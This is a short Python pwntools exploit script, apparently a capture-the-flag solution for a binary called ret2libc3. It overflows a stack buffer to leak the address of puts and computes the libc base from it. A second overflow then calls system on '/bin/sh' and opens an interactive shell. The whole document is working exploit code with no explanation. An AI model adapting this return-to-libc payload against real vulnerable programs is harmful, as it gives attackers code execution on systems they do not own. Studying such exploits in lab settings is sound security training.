from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')


puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
pop_ebp_ret = 0x080486ff

payload1 = 'A'*0x64+'aaaaaaaa'+'aaaa'+p32(puts_plt)+p32(pop_ebp_ret)+p32(puts_got)+p32(main_addr)

p.sendlineafter('Can you find it !?',payload1)

puts_addr = u32(p.recv(4))

libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
binsh_addr = libc.search('/bin/sh').next()

payload2 = 'A'*0x64+'aaaaaaaa'+'aaaa'+p32(system_addr)+p32(pop_ebp_ret)+p32(binsh_addr)

p.sendlineafter('Can you find it !?',payload2)

p.interactive()




